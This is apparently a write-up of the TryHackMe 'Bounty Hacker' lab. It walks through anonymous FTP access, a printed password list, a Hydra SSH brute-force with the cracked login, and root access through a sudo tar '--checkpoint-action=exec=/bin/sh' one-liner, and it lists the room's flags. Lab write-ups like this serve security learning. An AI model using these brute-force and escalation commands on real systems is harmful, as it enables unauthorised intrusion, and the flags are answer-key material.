# Bounty Hacker Write-Up
## Target IP Address: 10.10.244.212

## 1. Initial Nmap Scan

### The first step is to scan the target IP for open ports to get a better understanding of the services running on the machine. I used Nmap to scan the target:

nmap -sC -sV 10.10.244.212

### The scan revealed the following open ports:

  Port 21 (FTP): vsFTPd 3.0.3

  Port 22 (SSH): OpenSSH 7.6p1

### The FTP service was open, and the SSH service was also available for potential login.
## 2. FTP Enumeration

### I attempted to log into the FTP service using anonymous login:

ftp 10.10.244.212

### I successfully logged in with the username Anonymous and no password was required.

### Once inside the FTP server, I navigated through the available directories:

ls

### I discovered two files:

  task.txt: A file with some vague instructions.

  locks.txt: A file that might contain useful information.

## 3. Retrieving Files

### I retrieved the locks.txt file first:

get locks.txt

### Contents of locks.txt:



rEddrAGON

ReDdr4g0nSynd!cat3

Dr@gOn$yn9icat3

R3DDr46ONSYndIC@Te

ReddRA60N

R3dDrag0nSynd1c4te

dRa6oN5YNDiCATE

ReDDR4g0n5ynDIc4te

R3Dr4gOn2044

RedDr4gonSynd1cat3

R3dDRaG0Nsynd1c@T3

Synd1c4teDr@g0n

reddRAg0N

REddRaG0N5yNdIc47e

Dra6oN$yndIC@t3

4L1mi6H71StHeB357

rEDdragOn$ynd1c473

DrAgoN5ynD1cATE

ReDdrag0n$ynd1cate

Dr@gOn$yND1C4Te

RedDr@gonSyn9ic47e

REd$yNdIc47e

dr@goN5YNd1c@73

rEDdrAGOnSyNDiCat3

r3ddr@g0N

ReDSynd1ca7e





### These were potential password candidates for SSH access.

Next, I retrieved the task.txt file, which contained the following instructions:

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

### This file didn't provide much insight for now, so I turned my focus back to the password list.



## 4. Hydra Bruteforce Attack

### I ran a Hydra brute-force attack against the SSH service to test the possible passwords I retrieved from locks.txt:

hydra -l lin -P locks.txt ssh://10.10.244.212

### Hydra successfully cracked the password:

[DATA] attacking ssh://10.10.244.212:22/
[22][ssh] host: 10.10.244.212   login: lin   password: RedDr4gonSynd1cat3

## 5. Accessing User Account

### I logged into the machine using the lin user account with the cracked password:

ssh lin@10.10.244.212

### Once inside, I navigated to the Desktop directory and found the user.txt flag:

cat user.txt

Flag:

## THM{CR1M3_SyNd1C4T3}

## 6. Sudo Permissions Check

### I ran sudo -l to check if the lin user had any elevated privileges:

sudo -l

### The result showed that lin could run the /bin/tar command as root without a password:

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

## 7. Privilege Escalation

### Since lin could run /bin/tar as root, I decided to exploit this by using the tar command for privilege escalation. I executed the following command:

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

This command instructs tar to run /bin/sh as root upon hitting a checkpoint.



## 8. Accessing the Root Shell

### After running the above command, I was granted a root shell (# prompt). From here, I could access the /root/root.txt file and retrieve the final flag.

cat /root/root.txt

Flag:

## THM{G0T_R00T}



## Conclusion

### In this room, I successfully exploited an FTP server for initial access, brute-forced SSH login credentials, and escalated privileges using sudo to run the tar command as root. The room demonstrated the power of misconfigured sudo permissions and how to use common tools like Hydra and tar for privilege escalation.

Total Flags:

  User Flag: THM{CR1M3_SyNd1C4T3}

  Root Flag: THM{G0T_R00T}

## Tools Used:

  Nmap: For port scanning.

  Hydra: For brute-forcing SSH credentials.

  FTP: To enumerate files and retrieve password candidates.

  sudo: To check for privilege escalation opportunities.

  tar: Used for privilege escalation to root.


  ## proof of completing :

  ![Image](https://github.com/user-attachments/assets/e54497e8-29fd-4c34-bd2a-1a0afaae49d7)


  ![Image](https://github.com/user-attachments/assets/e02ea7ae-9881-4c8b-a3ab-ea2ecd40a441)

  
